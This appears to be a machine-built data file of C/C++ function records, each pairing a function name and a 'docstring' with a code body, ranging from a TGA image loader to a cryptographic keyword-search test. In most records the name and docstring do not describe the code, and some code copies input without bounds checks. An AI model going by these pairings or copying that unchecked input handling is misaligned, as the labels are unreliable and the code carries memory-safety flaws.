{"content":"{'function_name': 'LoadRegImage', 'docstring': '\/\/ This surface will tell us the details of the image', 'code': 'static GLuint LoadTGATexture ( char* filename, TGA* tgaFile )\\n{\\n\\tFILE *filePtr;\\n    unsigned char ucharBad;\\n    short int sintBad;\\n    long imageSize;\\n    int colorMode;\\n    unsigned char colorSwap;\\n\\n    \/\/ Open the TGA file.\\n    filePtr = fopen(filename, \"rb\");\\n    if(filePtr == NULL)\\n    {\\n        return false;\\n    }\\n\\n    \/\/ Read the two first bytes we don\\'t need.\\n    fread(&ucharBad, sizeof(unsigned char), 1, filePtr);\\n    fread(&ucharBad, sizeof(unsigned char), 1, filePtr);\\n\\n    \/\/ Which type of image gets stored in imageTypeCode.\\n    fread(&tgaFile->imageTypeCode, sizeof(unsigned char), 1, filePtr);\\n\\n    \/\/ For our purposes, the type code should be 2 (uncompressed RGB image)\\n    \/\/ or 3 (uncompressed black-and-white images).\\n    if (tgaFile->imageTypeCode != 2 && tgaFile->imageTypeCode != 3)\\n    {\\n        fclose(filePtr);\\n        return false;\\n    }\\n\\n    \/\/ Read 13 bytes of data we don\\'t need.\\n    fread(&sintBad, sizeof(short int), 1, filePtr);\\n    fread(&sintBad, sizeof(short int), 1, filePtr);\\n    fread(&ucharBad, sizeof(unsigned char), 1, filePtr);\\n    fread(&sintBad, sizeof(short int), 1, filePtr);\\n    fread(&sintBad, sizeof(short int), 1, filePtr);\\n\\n    \/\/ Read the image\\'s width and height.\\n    fread(&tgaFile->imageWidth, sizeof(short int), 1, filePtr);\\n    fread(&tgaFile->imageHeight, sizeof(short int), 1, filePtr);\\n\\n    \/\/ Read the bit depth.\\n    fread(&tgaFile->bitCount, sizeof(unsigned char), 1, filePtr);\\n\\n    \/\/ Read one byte of data we don\\'t need.\\n    fread(&ucharBad, sizeof(unsigned char), 1, filePtr);\\n\\n    \/\/ Color mode -> 3 = BGR, 4 = BGRA.\\n    colorMode = tgaFile->bitCount \/ 8;\\n    imageSize = tgaFile->imageWidth * tgaFile->imageHeight * colorMode;\\n\\n    \/\/ Allocate memory for the image data.\\n    tgaFile->imageData = (unsigned char*)malloc(sizeof(unsigned char)*imageSize);\\n\\n    \/\/ Read the image data.\\n    fread(tgaFile->imageData, sizeof(unsigned char), imageSize, filePtr);\\n\\n    \/\/ Change from BGR to RGB so OpenGL can read the image data.\\n    for (int imageIdx = 0; imageIdx < imageSize; imageIdx += colorMode)\\n    {\\n        colorSwap = tgaFile->imageData[imageIdx];\\n        tgaFile->imageData[imageIdx] = tgaFile->imageData[imageIdx + 2];\\n        tgaFile->imageData[imageIdx + 2] = colorSwap;\\n    }\\n\\n    fclose(filePtr);\\n    return true;\\n}'}","id":1921}
{"content":"{'function_name': 'ride_piece', 'docstring': '\/\/ Update selected x and y.', 'code': 'bool do_attack_calculation(int att, int def)\\n{\\n\\t\/\/ Add random chance values.\\n\\tatt = att + ((Rand() % 10) + 1);\\n\\tdef = def + ((Rand() % 10) + 1);\\n\\n\\tlog(\"Final att\/def values: %i, %i\", att, def);\\n\\n\\treturn (att > def);\\n}'}","id":1925}
{"content":"{'function_name': 'cast_IEEE754', 'docstring': '\/\/ std::cout << std::hex << \"result = \" << result.to_string(16) << std::dec << \"\\\\n\";', 'code': 'T cast_IEEE754(FP x, bool detect_overflow = false, typename enable_if<!std::numeric_limits<T>::is_signed, bool>::type dummy = true) {\\n    fp_struct<FP> xs(x);\\n    ap_ufixed<2*fp_struct<FP>::SIG_BITS + 8 * sizeof(T),\\n                fp_struct<FP>::SIG_BITS + 8 * sizeof(T)> mantissa = xs.mantissa();\\n\\n    ap_ufixed<  fp_struct<FP>::SIG_BITS + 8 * sizeof(T),\\n                fp_struct<FP>::SIG_BITS + 8 * sizeof(T)> smantissa = mantissa << xs.expv();\\n\\n    ap_ufixed<1            ,1 + 8 * sizeof(T), AP_TRN,AP_SAT> overflow_bits = smantissa;\\n    ap_ufixed<8 * sizeof(T),    8 * sizeof(T)> val = smantissa;\\n\\n    bool overflow = xs.expv() > (signed)(2*fp_struct<FP>::SIG_BITS) || overflow_bits != 0;\\n    ap_uint<8*sizeof(T)> minval = 0;\\n    if((overflow || xs.__signbit()) && detect_overflow) return minval;\\n\\n    \/\/ std::cout << std::hex << \"val = \" << val.to_string(16) << std::dec << \"\\\\n\";\\n    ap_ufixed<8 * sizeof(T),8 * sizeof(T)> result = val;\\n    \/\/ std::cout << std::hex << \"result = \" << result.to_string(16) << std::dec << \"\\\\n\";\\n    return result;\\n}'}","id":1928}
{"content":"{'function_name': 'UnregisterLeasingApplicationFromRefCounting', 'docstring': '\/\/', 'code': 'BOOL WINAPI\\nUnregisterLeasingApplicationWaitForZeroRefCount(\\n    HANDLE LeasingApplicationHandle\\n    )\\n\\n\/*++\\n \\nRoutine Description:\\n \\n    Internal routine. Waits for a leasing application ref count to go to 0.\\n\\nParameters Description:\\n \\n    LeasingApplicationHandle - leasing applicaiton handle to wait on.\\n \\nReturn Value:\\n \\n    TRUE if the leasing application is not closed.\\n \\n--*\/\\n\\n{\\n    BOOL IsZeroRefCount = FALSE;\\n    BOOL RetVal = FALSE;\\n    shared_ptr<ManualResetEvent> CloseRefCountEvent;\\n\\n    \/\/\\n    \/\/ Check arguments.\\n    \/\/\\n    if (NULL == LeasingApplicationHandle || \\n        INVALID_HANDLE_VALUE == LeasingApplicationHandle) {\\n\\n        SetLastError(ERROR_INVALID_HANDLE);\\n        \\n        return RetVal;\\n    }\\n\\n    LeaseLayerEvents.UnregisterWaitForZeroRefCount(LONGLONG(LeasingApplicationHandle));\\n\\n    {\\n        AcquireExclusiveLock lock(*LeaseLayerLock);\\n\\n        LEASING_APPLICATION_REF_COUNT_HASH_TABLE_ITERATOR IsFound;\\n\\n        \/\/\\n        \/\/ Make sure the entry is there.\\n        \/\/\\n        IsFound = LeasingApplicationRefCountHashTable->find(LeasingApplicationHandle);\\n        RetVal = (IsFound != LeasingApplicationRefCountHashTable->end());\\n\\n        if (RetVal) {\\n\\n                \/\/\\n                \/\/ Retrieve event.\\n                \/\/\\n                CloseRefCountEvent = IsFound->second.CloseEvent;\\n\\n                \/\/\\n                \/\/ Mark the leasing application as closing.\\n                \/\/\\n                IsZeroRefCount = CloseRef(&IsFound->second);\\n        }\\n\\n    }\\n\\n    \/\/\\n    \/\/ Wait for the last callback to complete.\\n    \/\/\\n    if (!IsZeroRefCount) {\\n\\n        ASSERT_IFNOT(TRUE == RetVal, \\n            \"UnregisterLeasingApplicationWaitForZeroRefCount leasing application {0} is not in the refcount hash table\", \\n            LeasingApplicationHandle);\\n        auto closed = CloseRefCountEvent->WaitOne(TimeSpan::FromSeconds(30));\\n        ASSERT_IFNOT(closed, \"WaitForSingleObject does not reach zero ref count\");\\n    }\\n\\n    return RetVal;\\n}'}","id":1929}
{"content":"{'function_name': 'icvGrabFrameAVI_FFMPEG', 'docstring': '\/\/ return if we have a new picture or not\\r', 'code': 'CV_IMPL int cvWriteFrame( CvVideoWriter * writer, const IplImage * image )\\r\\n{\\r\\n\\tint ret = 0;\\r\\n\\r\\n\\tCV_FUNCNAME(\"cvWriteFrame\");\\r\\n\\r\\n\\t__BEGIN__;\\r\\n\\r\\n\\t\/\/ typecast from opaque data type to implemented struct\\r\\n\\tCvAVI_FFMPEG_Writer * mywriter = (CvAVI_FFMPEG_Writer*) writer;\\r\\n#if LIBAVFORMAT_BUILD > 4628\\r\\n    AVCodecContext *c = mywriter->video_st->codec;\\r\\n#else\\r\\n\\tAVCodecContext *c = &(mywriter->video_st->codec);\\r\\n#endif\\r\\n\\t\/\/ check parameters\\r\\n\\tassert ( image );\\r\\n\\tassert ( image->nChannels == 3 );\\r\\n\\tassert ( image->depth == IPL_DEPTH_8U );\\r\\n\\r\\n\\r\\n\\t\/\/ check if buffer sizes match, i.e. image has expected format (size, channels, bitdepth, alignment)\\r\\n\\tassert (image->imageSize == avpicture_get_size (PIX_FMT_BGR24, image->width, image->height));\\r\\n\\r\\n\\tif (c->pix_fmt != PIX_FMT_BGR24 ) {\\r\\n\\t\\tassert( mywriter->rgb_picture );\\r\\n\\t\\t\/\/ let rgb_picture point to the raw data buffer of \\'image\\'\\r\\n\\t\\tavpicture_fill((AVPicture *)mywriter->rgb_picture, (uint8_t *) image->imageData, \\r\\n\\t\\t\\t\\tPIX_FMT_BGR24, image->width, image->height);\\r\\n\\r\\n\\t\\t\/\/ convert to the color format needed by the codec\\r\\n\\t\\tif( img_convert((AVPicture *)mywriter->picture, c->pix_fmt,\\r\\n\\t\\t\\t\\t\\t(AVPicture *)mywriter->rgb_picture, PIX_FMT_BGR24, \\r\\n\\t\\t\\t\\t\\timage->width, image->height) < 0){\\r\\n\\t\\t\\tCV_ERROR(CV_StsUnsupportedFormat, \"FFMPEG::img_convert pixel format conversion from BGR24 not handled\");\\r\\n\\t\\t}\\r\\n\\t}\\r\\n\\telse{\\r\\n\\t\\tavpicture_fill((AVPicture *)mywriter->picture, (uint8_t *) image->imageData,\\r\\n\\t\\t\\t\\tPIX_FMT_BGR24, image->width, image->height);\\r\\n\\t}\\r\\n\\r\\n\\tret = icv_av_write_frame_FFMPEG( mywriter->oc, mywriter->video_st, mywriter->outbuf, mywriter->outbuf_size, mywriter->picture);\\r\\n\\r\\n\\t__END__;\\r\\n\\treturn ret;\\r\\n}'}","id":1931}
{"content":"{'function_name': 'os_write_shared_block', 'docstring': '\/\/ @Bug name.Length is not enough (2 wide chars for one char)', 'code': 'void os_read_shared_block(const string &name, void *out, s64 size) {\\n    \/\/ @Bug name.Length is not enough (2 wide chars for one char)\\n    auto *name16 = allocate_array(utf16, name.Length + 1, Context.Temp);\\n    utf8_to_utf16(name.Data, name.Length, name16);\\n\\n    CREATE_MAPPING_CHECKED(h, OpenFileMappingW(FILE_MAP_READ, false, name16), );\\n    defer(CloseHandle(h));\\n\\n    void *result = MapViewOfFile(h, FILE_MAP_READ, 0, 0, size);\\n    if (!result) {\\n        windows_report_hresult_error(HRESULT_FROM_WIN32(GetLastError()), \"MapViewOfFile\", __FILE__, __LINE__);\\n        return;\\n    }\\n\\n    copy_memory(out, result, size);\\n    UnmapViewOfFile(result);\\n}'}","id":1933}
{"content":"{'function_name': 'binomial', 'docstring': '\/\/this is the maximum n for which binomial(n,k) < 2^63 for any k.', 'code': 'inline BigIntType motzkin(llint n)\\n{\\n\\tstatic std::vector<BigIntType> M = {1, 1, 2, 4, 9, 21, 51, 127, 323};\\n\/\/ \\tstatic std::vector<BigIntType> M = {1, 1, 2, 4, 9, 21, 51, 127, 323, 835, 2188, 5798, 15511, 41835, 113634, 310572, 853467, 2356779, 6536382, 18199284, 50852019, 142547559, 400763223, 1129760415, 3192727797, 9043402501, 25669818476, 73007772802, 208023278209, 593742784829};\\n\\t\\n\\tllint Msize = M.size();\\n\\n\\tif (n < Msize)\\n\\t\\treturn M[n];\\n\\t\\n\\tllint oldsize = M.size();\\n\\tM.resize(n+1);\\n\\tfor (long m = oldsize; m <= n; ++m)\\n\\t{\\n\\t\\tM[m] = ( (2*m+1)*M[m-1] + (3*m - 3)*M[m-2] )\/(m+2); \/\/quite likely overflow if using llint\\n\\t}\\n\\n\\treturn M[n];\\n}'}","id":1944}
{"content":"{'function_name': 'subarray_from_capnp', 'docstring': \"\/\/ If cap'n proto object has stats set it on c++ object\", 'code': \"Status subarray_partitioner_to_capnp(\\n    const ArraySchema& schema,\\n    const SubarrayPartitioner& partitioner,\\n    capnp::SubarrayPartitioner::Builder* builder) {\\n  \/\/ Subarray\\n  auto subarray_builder = builder->initSubarray();\\n  RETURN_NOT_OK(\\n      subarray_to_capnp(schema, &partitioner.subarray(), &subarray_builder));\\n\\n  \/\/ Per-attr\/dim mem budgets\\n  const auto* budgets = partitioner.get_result_budgets();\\n  if (!budgets->empty()) {\\n    auto mem_budgets_builder = builder->initBudget(budgets->size());\\n    size_t idx = 0;\\n    for (const auto& pair : (*budgets)) {\\n      const std::string& name = pair.first;\\n      auto budget_builder = mem_budgets_builder[idx];\\n      budget_builder.setAttribute(name);\\n      auto var_size = schema.var_size(name);\\n\\n      if (name == constants::coords || !var_size) {\\n        budget_builder.setOffsetBytes(0);\\n        budget_builder.setDataBytes(pair.second.size_fixed_);\\n      } else {\\n        budget_builder.setOffsetBytes(pair.second.size_fixed_);\\n        budget_builder.setDataBytes(pair.second.size_var_);\\n      }\\n\\n      budget_builder.setValidityBytes(pair.second.size_validity_);\\n\\n      idx++;\\n    }\\n  }\\n\\n  \/\/ Current partition info\\n  const auto* partition_info = partitioner.current_partition_info();\\n  \/\/ If the array is null that means there is no current partition info\\n  if (partition_info->partition_.array() != nullptr) {\\n    auto info_builder = builder->initCurrent();\\n    auto info_subarray_builder = info_builder.initSubarray();\\n    RETURN_NOT_OK(subarray_to_capnp(\\n        schema, &partition_info->partition_, &info_subarray_builder));\\n    info_builder.setStart(partition_info->start_);\\n    info_builder.setEnd(partition_info->end_);\\n    info_builder.setSplitMultiRange(partition_info->split_multi_range_);\\n  }\\n\\n  \/\/ Partitioner state\\n  const auto* state = partitioner.state();\\n  auto state_builder = builder->initState();\\n  state_builder.setStart(state->start_);\\n  state_builder.setEnd(state->end_);\\n  auto single_range_builder =\\n      state_builder.initSingleRange(state->single_range_.size());\\n  size_t sr_idx = 0;\\n  for (const auto& subarray : state->single_range_) {\\n    auto b = single_range_builder[sr_idx];\\n    RETURN_NOT_OK(subarray_to_capnp(schema, &subarray, &b));\\n    sr_idx++;\\n  }\\n  auto multi_range_builder =\\n      state_builder.initMultiRange(state->multi_range_.size());\\n  size_t m_idx = 0;\\n  for (const auto& subarray : state->multi_range_) {\\n    auto b = multi_range_builder[m_idx];\\n    RETURN_NOT_OK(subarray_to_capnp(schema, &subarray, &b));\\n    m_idx++;\\n  }\\n\\n  \/\/ Overall mem budget\\n  uint64_t mem_budget, mem_budget_var, mem_budget_validity;\\n  RETURN_NOT_OK(partitioner.get_memory_budget(\\n      &mem_budget, &mem_budget_var, &mem_budget_validity));\\n  builder->setMemoryBudget(mem_budget);\\n  builder->setMemoryBudgetVar(mem_budget_var);\\n  builder->setMemoryBudgetValidity(mem_budget_validity);\\n\\n  \/\/ If stats object exists set its cap'n proto object\\n  stats::Stats* stats = partitioner.stats();\\n  if (stats != nullptr) {\\n    auto stats_builder = builder->initStats();\\n    RETURN_NOT_OK(stats_to_capnp(*stats, &stats_builder));\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":1945}
{"content":"{'function_name': 'citanje_glavne_datoteke', 'docstring': '\/\/citanje datoteke red po red', 'code': 'void citanje_dolazaka_poslova(int N){\\n\\n\\t\/\/varijabla za u\u010ditavanje redova\\n\\tstring redak;\\n\\t\/\/brojac redaka\\n\\tint brojac=0;\\n\\t\/\/pocetna vrijednost u datoteci\\n\\tint redovi, kolone;\\n\\t\/\/broj poslova u ovom ispitivanju\\n\\tint broj_aktivnih_poslova=vektor_poslova[N];\\n\\n\\t\/\/ime glavne ulazne datoteke\\n\\tifstream ulazna(dolasci_poslova.c_str());\\n\\n\\tif(!ulazna){\\n\\t\\tcout<<\"Pogreska prilikom otvaranja datoteke! Datoteka \"<<dolasci_poslova<<\" nije uspjesno otvorena ili se ne nalazi u trenutnom direktoriju\"<<endl;\\n\\t\\treturn;\\n\\t}\\n\\n\\t\/\/citanje datoteke red po red\\n\\twhile(getline(ulazna,redak)){\\n\\n\\t\\tstring poms;\\n\\t\\tstringstream sTok(redak);\\n\\t\\t\/\/ucitavam sTok u poms\\n\\t\\tint pomi;\\n\\n\\t\\tif(brojac==0){\\n\\t\\t\\tsTok>>redovi;\\n\\t\\t\\tsTok>>kolone;\\n\\n\\t\\t\\tif((redovi!=konstante.broj_skupova) || (kolone!=konstante.max_br_poslova)){\\n\\t\\t\\t\\tcout<<\"Procitana datoteka nije kompatibilna sa zadanim problemom. Prekid rada.\"<<endl;\\n\\t\\t\\t\\treturn;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tif(brojac==(N+1)){\\n\\t\\t\\tint i=0;\\n\\t\\t\\twhile(sTok>>pomi){\\n\\t\\t\\t\\tposlovi[i].Rpripravnost=pomi;\\n\\t\\t\\t\\ti++;\\n\\n\\t\\t\\t\\tif(i==broj_aktivnih_poslova)\\n\\t\\t\\t\\t\\tbreak;\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\t}\\n\\n\\t\\tbrojac++;\\n\\t}\\n}'}","id":1951}
{"content":"{'function_name': 'MimeOleGetExtContentTypeW', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleGetFileInfo(\\r\\n                              LPSTR    pszFilePath,   LPSTR   *ppszCntType,\\r\\n                              LPSTR   *ppszSubType,   LPSTR   *ppszCntDesc,\\r\\n                              LPSTR   *ppszFileName,  LPSTR   *ppszExtension)\\r\\n{\\r\\n    HRESULT hr = S_OK;\\r\\n    LPWSTR  pwszFilePath,\\r\\n            pwszCntType = NULL,\\r\\n            pwszSubType = NULL,\\r\\n            pwszCntDesc = NULL,\\r\\n            pwszFileName = NULL,\\r\\n            pwszExtension = NULL;\\r\\n    LPSTR   pszCntType = NULL,\\r\\n            pszSubType = NULL,\\r\\n            pszCntDesc = NULL,\\r\\n            pszFileName = NULL,\\r\\n            pszExtension = NULL;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == pszFilePath)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    IF_NULLEXIT(pwszFilePath = PszToUnicode(CP_ACP, pszFilePath));\\r\\n\\r\\n    \/\/ Only pass in parameters for items that \\r\\n    IF_FAILEXIT(hr = MimeOleGetFileInfoW(pwszFilePath,\\r\\n        ppszCntType     ? &pwszCntType      : NULL,\\r\\n        ppszSubType     ? &pwszSubType      : NULL,\\r\\n        ppszCntDesc     ? &pwszCntDesc      : NULL,\\r\\n        ppszFileName    ? &pwszFileName     : NULL,\\r\\n        ppszExtension   ? &pwszExtension    : NULL));\\r\\n\\r\\n    if (ppszCntType)\\r\\n    {\\r\\n        Assert(pwszCntType);\\r\\n        IF_NULLEXIT(pszCntType = PszToANSI(CP_ACP, pwszCntType));\\r\\n    }\\r\\n    if (ppszSubType)\\r\\n    {\\r\\n        Assert(pwszSubType);\\r\\n        IF_NULLEXIT(pszSubType = PszToANSI(CP_ACP, pwszSubType));\\r\\n    }\\r\\n    if (ppszCntDesc)\\r\\n    {\\r\\n        Assert(pwszCntDesc);\\r\\n        IF_NULLEXIT(pszCntDesc = PszToANSI(CP_ACP, pwszCntDesc));\\r\\n    }\\r\\n    if (ppszFileName)\\r\\n    {\\r\\n        Assert(pwszFileName);\\r\\n        IF_NULLEXIT(pszFileName = PszToANSI(CP_ACP, pwszFileName));\\r\\n    }\\r\\n    if (ppszExtension)\\r\\n    {\\r\\n        Assert(pwszExtension);\\r\\n        IF_NULLEXIT(pszExtension = PszToANSI(CP_ACP, pwszExtension));\\r\\n    }\\r\\n\\r\\n    if (ppszCntType)\\r\\n        *ppszCntType = pszCntType;\\r\\n\\r\\n    if (ppszSubType)\\r\\n        *ppszSubType = pszSubType;\\r\\n\\r\\n    if (ppszCntDesc)\\r\\n        *ppszCntDesc = pszCntDesc;\\r\\n\\r\\n    if (ppszFileName)\\r\\n        *ppszFileName = pszFileName;\\r\\n\\r\\n    if (ppszExtension)\\r\\n        *ppszExtension = pszExtension;\\r\\n\\r\\n\\r\\nexit:\\r\\n    MemFree(pwszCntType);\\r\\n    MemFree(pwszSubType);\\r\\n    MemFree(pwszCntDesc);\\r\\n    MemFree(pwszFileName);\\r\\n    MemFree(pwszExtension);\\r\\n    MemFree(pwszFilePath);\\r\\n\\r\\n    if (FAILED(hr))\\r\\n    {\\r\\n        MemFree(pszCntType);\\r\\n        MemFree(pszSubType);\\r\\n        MemFree(pszCntDesc);\\r\\n        MemFree(pszFileName);\\r\\n        MemFree(pszExtension);\\r\\n    }\\r\\n\\r\\n    return hr;     \\r\\n}'}","id":1958}
{"content":"{'function_name': 'SDLSoundGetNextSoundFiller', 'docstring': '\/\/ Write silence into the buffer\\r', 'code': 'static int SDLSoundCheck() {\\r\\n    int drawframe=0;\\r\\n\\tif (!bAudPlaying) {\\r\\n\\t\\tdprintf(_T(\"SDLSoundCheck (not playing)\\\\n\"));\\r\\n\\t\\treturn 0;\\r\\n\\t}\\r\\n    \\r\\n    while (buffer_ana_flag[buffer_ana_gen_ofs]) {\\r\\n\\t\\t\/\/[NSThread sleepForTimeInterval:DEFAULT_WAIT_TIME_MS];\\r\\n        usleep(100); \/\/0.1ms\\r\\n\\t\\tif (bAudPlaying==0) {\\r\\n\\t\\t\\treturn 0;\\r\\n\\t\\t}\\r\\n\\t}\\r\\n    \\r\\n    \/\/\\t\\tdprintf(_T(\"Filling seg %i at %i\\\\n\"), nSDLFillSeg, nSDLFillSeg * (nAudSegLen << 2));\\r\\n    if (cur_ifba_conf->video_fskip==10) {\/\/AUTO Frame skip\\r\\n        int diff_buf=buffer_ana_gen_ofs-buffer_ana_play_ofs;\\r\\n        if (diff_buf<0) diff_buf+=nAudSegCount;\\r\\n        if (diff_buf>=nAudSegCount\/2) drawframe=1;\\r\\n        \/\/if (drawframe==0) printf(\"yo\\\\n\");\\r\\n    } else {\\r\\n        video_fskipcounter++;\\r\\n        if (video_fskipcounter>cur_ifba_conf->video_fskip) {\\r\\n            video_fskipcounter=0;\\r\\n            drawframe=1;\\r\\n        } else drawframe=0;\\r\\n    }\\r\\n    GetNextSound(drawframe);    \\r\\n    \/\/    if (nAudDSPModule) DspDo(nAudNextSound, nAudSegLen);\\r\\n    memcpy(buffer_ana[buffer_ana_gen_ofs], nAudNextSound, nAudSegLen << 2);\\r\\n    buffer_ana_flag[buffer_ana_gen_ofs]=1;\\r\\n    buffer_ana_gen_ofs++;\\r\\n    if (buffer_ana_gen_ofs==nAudSegCount) buffer_ana_gen_ofs=0;\\r\\n    \\r\\n\\treturn 0;\\r\\n}'}","id":1960}
{"content":"{'function_name': 'solve', 'docstring': '\/\/ sqrt(e) = r  => e = r^2;\\r', 'code': 'inline bool solve(const expr<division,ref2<var<double>>,ref2<var<double>>>& e, const double& r) noexcept        \\r\\n{\\r\\n    \/\/ n\/m = 3.1415926 => n=22,m=7\\r\\n    long m[2][2] = {\\r\\n                        {1,0},\\r\\n                        {0,1}\\r\\n                   };\\r\\n    double x      = r;\\r\\n    \/\/double startx = r;\\r\\n    long maxden   = 100;\\r\\n    long ai;\\r\\n\\r\\n    \/* loop finding terms until denom gets too big *\/\\r\\n    while (m[1][0] *  ( ai = (long)x ) + m[1][1] <= maxden) {\\r\\n        long t;\\r\\n        t = m[0][0] * ai + m[0][1];\\r\\n        m[0][1] = m[0][0];\\r\\n        m[0][0] = t;\\r\\n        t = m[1][0] * ai + m[1][1];\\r\\n        m[1][1] = m[1][0];\\r\\n        m[1][0] = t;\\r\\n        if(x==(double)ai) break;     \/\/ AF: division by zero\\r\\n        x = 1\/(x - (double) ai);\\r\\n        if(x>(double)0x7FFFFFFF) break;  \/\/ AF: representation failure\\r\\n    } \\r\\n\\r\\n    \/\/\/* now remaining x is between 0 and 1\/ai *\/\\r\\n    \/\/\/* approx as either 0 or 1\/m where m is max that will fit in maxden *\/\\r\\n    \/\/\/* first try zero *\/\\r\\n    \/\/printf(\"%ld\/%ld, error = %e\\\\n\", m[0][0], m[1][0], startx - ((double) m[0][0] \/ (double) m[1][0]));\\r\\n\\r\\n    \/\/\/* now try other possibility *\/\\r\\n    \/\/ai = (maxden - m[1][1]) \/ m[1][0];\\r\\n    \/\/m[0][0] = m[0][0] * ai + m[0][1];\\r\\n    \/\/m[1][0] = m[1][0] * ai + m[1][1];\\r\\n    \/\/printf(\"%ld\/%ld, error = %e\\\\n\", m[0][0], m[1][0], startx - ((double) m[0][0] \/ (double) m[1][0]));\\r\\n    e.m_e1(m[0][0]);\\r\\n    e.m_e2(m[1][0]);\\r\\n    return true;\\r\\n}'}","id":1961}
{"content":"{'function_name': 'imageProcessor', 'docstring': '\/\/scan through every pixel ', 'code': 'int main() {\\n    String path, algo = \"min_max\";  \/\/choose the algorithm - average, luminosity or min_max\\n\\n    \/\/the following is to take an existing photo and convert to ascii\\n\\n    path = \"C:\/Users\/justi\/Pictures\/Edited.png\";\\n    Mat img1 = imread(path), img2;\\n    resize(img1, img2, Size(900, 355));\\n    imageProcessor(img2, algo);\\n    \\n\\n    \/\/\/\/the following code is used to capture still shots from an external device\/webcam and convert to ascii art in real time\\n\\n    \/\/while (true) {\\n\\n    \/\/    VideoCapture cap(0);\\n    \/\/    Mat vid, vid2;\\n    \/\/    \\n    \/\/    cap.read(vid);\\n    \/\/    resize(vid, vid2, Size(500, 250));\\n    \/\/    imshow(\"video\", vid);\\n    \/\/    imageProcessor(vid2, algo);\\n    \/\/    waitKey(1);\\n\\n    \/\/}\\n    return 0; \\n}'}","id":1964}
{"content":"{'function_name': 'Test', 'docstring': '\/* Free the memory *\/', 'code': 'int peks_scheme(char* W1, char *W2)\\n{\\n\\t\/* Order of group G1 and G2 *\/\\n\\tdouble P;\\n\\n\\t\/* Apriv = \u03b1 and Apub = [g, h=g^\u03b1] *\/\\n\\tkey key;\\n\\n\\t\/* Trapdoor *\/\\n\\telement_t Tw;\\n\\n\\t\/* H1(W) *\/\\n\\telement_t H1_W1;\\n\\n\\t\/* PBC data types *\/\\n\\tpbc_param_t param;\\n\\tpairing_t pairing;\\n\\n\\t\/* Initialize pairing *\/\\n\\tinit_pbc_param_pairing(param, pairing);\\n\\n\\t\/* Get the order of G1 *\/\\n\\tP = mpz_get_d(pairing->r);\\n\\n\\t\/\/int nlogP = log2(P);\\n\\n\\t\/* KeyGen *\/\\n\\tKeyGen(&key, param, pairing);\\n\\n\\n\\t\/* H1(W) *\/\\n    char *hashedW = (char*) malloc(sizeof(char)*SHA512_DIGEST_LENGTH*2+1);\\n\\tsha512(W1, (int)strlen(W1), hashedW);\\n\\telement_init_G1(H1_W1, pairing);\\n\\telement_from_hash(H1_W1, hashedW, (int)strlen(hashedW));\\n\\n\\n\\t\/* Trapdoor *\/\\n\\tTrapdoor(Tw, pairing, key.priv, H1_W1);\\n\\n\\tint match;\\n\\tmatch =\\tTest(W2, (int)strlen(W2), &key.pub, Tw, pairing);\\n\\n\\tfree(hashedW); hashedW = NULL;\\n\\t\/\/free(peks.B); peks.B = NULL;\\n\\tpbc_param_clear(param);\\n\\treturn match;\\n}'}","id":1965}
{"content":"{'function_name': 'dfsVisit', 'docstring': '\/\/input ', 'code': 'bool hascycle()\\n{\\n\\tint num = 0;\\n\\tscanf(\"%d\", &num);\/\/number of nodes\\n\\tprintf(\"the graph has %d nodes\\\\n\", num);\\n\\tunordered_set<int>s;\\n\\tint edgeStart = 0, edgeEnd = 0;\/\/input \\n\\tvector<Edge>edge;\\n\\twhile (scanf(\"%d%d\", &edgeStart, &edgeEnd) == 2)\\n\\t{\\n\\t\\tedge.push_back(Edge(edgeStart, edgeEnd));\\n\\t\\ts.insert(edgeStart);\\n\\t\\ts.insert(edgeEnd);\\n\\t}\\n\\tvector<int>nums(s.begin(), s.end());\\n\\tUnionFind uf(nums);\\n\\tfor (Edge it : edge)\\n\\t{\\n\\t\\tint xx = uf.findroot(it.src);\\n\\t\\tint yy = uf.findroot(it.des);\\n\\t\\tif (xx != yy)uf.Union(xx, yy);\\n\\t\\telse return true;\\n\\t}\\n\\treturn false;\\n}'}","id":1968}
{"content":"{'function_name': 'main_MFR_V2_GenerateTrajectoryType', 'docstring': \"\/\/ Call the entry-point 'MFR_V2_GenerateTrajectoryType'.\", 'code': 'int main(int, const char * const [])\\n{\\n  \/\/ The initialize function is being called automatically from your entry-point function. So, a call to initialize is not included here. \\n  \/\/ Invoke the entry-point functions.\\n  \/\/ You can call entry-point functions multiple times.\\n  main_MFR_V2_GenerateTrajectoryType();\\n  main_MFR_V2_GenerateMFRType();\\n  main_MFR_V2_Cycle();\\n\\n  \/\/ Terminate the application.\\n  \/\/ You do not need to do this more than one time.\\n  MFR_V2_Cycle_terminate();\\n  return 0;\\n}'}","id":1969}
{"content":"{'function_name': 'STAHLSOFT_HRX_TRY', 'docstring': '\/\/ Setup key name\\r', 'code': 'HRESULT _SetCollectionAlertDword(LPCSTR lpszName, DWORD dwVal)\\r\\n{\\r\\n\\tHRESULT hr = S_OK;\\r\\n\\tStahlSoft::HRX hrx;\\r\\n\\tCNAVOptFileEx alertFile;\\r\\n\\tPNAVOPT32_VALUE_INFO pInfo = NULL;\\r\\n\\r\\n\\ttry\\r\\n\\t{\\r\\n\\t\\thrx << (lpszName? S_OK : E_FAIL);\\r\\n\\r\\n\\t\\tUINT uCount = 0;\\r\\n\\t\\thrx << (alertFile.Init(g_szAlertFile, FALSE) ? S_OK : E_FAIL);\\r\\n\\t\\thrx << alertFile.GetValuesInfo(&pInfo, &uCount);\\r\\n\\r\\n\\t\\tchar szName[MAX_PATH] = {0};\\r\\n\\t\\tstrcpy(szName, lpszName);\\r\\n\\t\\tstrcat(szName, \":\");\\r\\n\\r\\n\\t\\tfor(int i=0; i<uCount; ++i)\\r\\n\\t\\t{\\r\\n\\t\\t\\tLPSTR lpstr = ::strstr (pInfo[i].szValue, szName);\\r\\n\\t\\t\\tif(lpstr == pInfo[i].szValue)\\r\\n\\t\\t\\t\\talertFile.SetValue(pInfo[i].szValue, dwVal);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\talertFile.Save();\\r\\n\\t}\\r\\n\\tcatch(_com_error& e)\\r\\n\\t{\\r\\n\\t\\thr = e.Error();\\r\\n\\t\\tCCTRACEE(_T(\"_SetCollectionAlertDword - Exception while accessing alert.dat %08X\"), hr);\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ Free the list of 